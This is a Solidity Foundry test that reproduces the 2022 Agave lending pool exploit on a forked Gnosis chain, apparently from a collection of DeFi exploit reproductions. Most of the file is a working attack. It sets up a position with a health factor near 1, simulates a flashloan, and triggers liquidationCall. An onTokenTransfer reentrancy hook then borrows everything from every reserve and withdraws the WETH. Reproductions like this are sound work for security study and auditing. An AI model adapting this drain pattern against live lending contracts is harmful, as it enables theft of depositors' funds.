// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface IGnosisBridgedAsset is IERC20 {
    function mint(address, uint256) external returns (bool);
}

// @KeyInfo - Total Lost : ~1.5M US$
// Attacker : https://gnosisscan.io/address/0x0a16a85be44627c10cee75db06b169c7bc76de2c
// Attack Contract : https://gnosisscan.io/address/0xF98169301B06e906AF7f9b719204AA10D1F160d6
// Vulnerable Contract : https://gnosisscan.io/address/0x207E9def17B4bd1045F5Af2C651c081F9FDb0842 (Agave lending pool v1)
// Attack Tx : https://gnosisscan.io/tx/0xa262141abcf7c127b88b4042aee8bf601f4f3372c9471dbd75cb54e76524f18e

// @Info
// Vulnerable Contract Code : https://github.com/Agave-DAO/protocol-v2/commit/31922797ba110ddb3e908936b940b40221b7e190#diff-d237d9f48e3d6657a5f94c89b903c5003cba6f9a286e26eff509cb44a3f4ee8f

// @Analysis
// Post-mortem :https://medium.com/agavefinance/agave-exploit-reentrancy-in-liquidation-call-51ae407bc56
// Twitter Guy : https://twitter.com/Mudit__Gupta/status/1503783633877827586

/*
Detailed explanation of the agave exploit attack flow:

1. Prepare Phase:
   - Initial Condition: Ensure that the health factor is slightly above 1.
   - Transition: Advance time by one hour after the initial prepare.
   - Objective: Reduce the health factor to less than 1 in the next block.
   - Purpose: This step is essential for the liquidation call to work, as it requires a health factor below 1.

2. Flashloan and Deposit Phase:
   - Action: Execute a flashloan and deposit tokens.
   - Exploited Assets: In this exploit, withdraw and borrow all funds from WETH and maximize borrowing from all available pools.

3. Exploit Completion:
   - Result: Successful execution drains funds from the lending pool.

Note: These concise steps outline the specific actions taken in each phase of the agave exploit, providing a clear understanding of the attack flow.
*/

contract AgaveExploit is Test {
    //Prepare numbers
    uint256 linkLendNum1 = 1_000_000_000_000_000_100;
    uint256 wethlendnum2 = 1;
    uint256 linkDebt3 = 700_000_000_000_000_000;
    uint256 wethDebt4 = 1;
    uint256 linkWithdraw5 = 66_666_666_660_000_000;

    uint256 callCount = 0;
    uint256 wethLiqBeforeHack = 0;

    //Asset addrs
    address aweth = 0xb5A165d9177555418796638447396377Edf4C18a;
    address gno = 0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb;
    address weth = 0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1;
    address link = 0xE2e73A1c69ecF83F464EFCE6A5be353a37cA09b2;
    address wbtc = 0x8e5bBbb09Ed1ebdE8674Cda39A0c169401db4252;
    address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
    address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;

    //Asset interfaces
    IGnosisBridgedAsset WETH = IGnosisBridgedAsset(weth);
    IGnosisBridgedAsset LINK = IGnosisBridgedAsset(link);

    // Contract / exchange interfaces
    ILendingPoolAddressesProvider providerAddrs;
    ILendingPool lendingPool;

    uint256 ethFlashloanAmt = 2730 ether;

    function setUp() public {
        vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
        providerAddrs = ILendingPoolAddressesProvider(0xA91B9095eFa6C0568467562032202108e49c9Ef8);
        lendingPool = ILendingPool(providerAddrs.getLendingPool());
        console.log(providerAddrs.getPriceOracle());
        //Lets just mint weth to this contract for initial debt
        vm.startPrank(0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d);
        wethLiqBeforeHack = getAvailableLiquidity(weth);
        //Mint initial weth funding
        WETH.mint(address(this), 2728.934387414251504146 ether);
        WETH.mint(address(this), 1);
        // Mint LINK funding
        LINK.mint(address(this), linkLendNum1);
        vm.stopPrank();

        //Approve funds
        LINK.approve(address(lendingPool), type(uint256).max);
        WETH.approve(address(lendingPool), type(uint256).max);
    }

    function getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
    }

    function getHealthFactor() public view returns (uint256) {
        (,,,,, uint256 healthFactor) = lendingPool.getUserAccountData(address(this));
        return healthFactor;
    }

    function prepare() public {
        //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc

        uint256 balance = LINK.balanceOf(address(this));
        require(balance > 0, "no link");

        //Deposit weth to aave v2 fork
        lendingPool.deposit(link, linkLendNum1, address(this), 0);
        lendingPool.deposit(weth, wethlendnum2, address(this), 0);

        //Enable asset as collateral

        lendingPool.setUserUseReserveAsCollateral(link, true);
        lendingPool.setUserUseReserveAsCollateral(weth, true);

        //Borrow initial setup prepare debts
        lendingPool.borrow(link, linkDebt3, 2, 0, address(this));
        lendingPool.borrow(weth, wethDebt4, 2, 0, address(this));

        //Withdraw as per tx
        lendingPool.withdraw(link, linkWithdraw5, address(this));
    }

    function _logTokenBal(address asset) internal view returns (uint256) {
        return IERC20(asset).balanceOf(address(this));
    }

    function _logBalances(string memory message) internal {
        console.log(message);
        console.log("--- Start of balances --- ");
        console.log("WETH Balance %d", _logTokenBal(weth));
        console.log("aWETH Balance %d", _logTokenBal(aweth));
        console.log("USDC Balance %d", _logTokenBal(usdc));
        console.log("GNO Balance %d", _logTokenBal(gno));
        console.log("LINK Balance %d", _logTokenBal(link));
        console.log("WBTC Balance %d", _logTokenBal(wbtc));
        console.log("healthf : %d", getHealthFactor());
        console.log("--- End of balances --- ");
    }

    function testExploit() public {
        //Call prepare and get it setup
        prepare();
        _logBalances("Before hack balances");
        flashloanFundingWETH();
        _logBalances("After hack balances");
    }

    function flashloanFundingWETH() internal {
        this.uniswapV2Call(address(this), ethFlashloanAmt, 0, new bytes(0));
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        //We simulate a flashloan from uniswap for initial eth funding
        attackLogic(_amount0, _amount1, _data);
    }

    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
        //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);
        //This will start the reentrancy with ontokentransfer call on .burn of the atoken
        lendingPool.liquidationCall(weth, weth, address(this), 2, false);
        //This will withdraw the funds from weth lending pool
        lendingPool.withdraw(weth, _logTokenBal(aweth), address(this));
        //Calculation of flashloan fees for uniswap v2 pair,we just emulate it here for continuity purposes
        uint256 amountRepay = ((ethFlashloanAmt * 1000) / 997) + 1;
        require(amountRepay < WETH.balanceOf(address(this)), "not enough eth");
        //For test case we just send it to address(1) to reduce the flashloan amount from us to get final assets
        WETH.transfer(address(1), amountRepay);
    }

    function depositWETH() internal {
        lendingPool.deposit(weth, 1, address(this), 0);
    }

    function maxBorrow(address asset, bool maxxx) internal {
        uint256 reserveTokenbal = getAvailableLiquidity(asset);
        uint256 BorrowAmount = reserveTokenbal > 2 ? reserveTokenbal - 1 : 0;
        if (BorrowAmount > 0) {
            lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
        }
    }

    function borrowMaxtokens() internal {
        lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
        maxBorrow(usdc, true);
        maxBorrow(link, true);
        maxBorrow(wbtc, true);
        maxBorrow(gno, true);
        maxBorrow(wxdai, true);
        //We borrow directly here cause of some edge case the maxborrow fails for weth
        lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
    }

    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
        console.log("tokencall From: %s, Value: %d", _from, _value);
        //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1
        if (_from == aweth && _value == 1) {
            callCount++;
        }
        if (callCount == 2 && _from == aweth && _value == 1) {
            borrowMaxtokens();
        }
    }
}
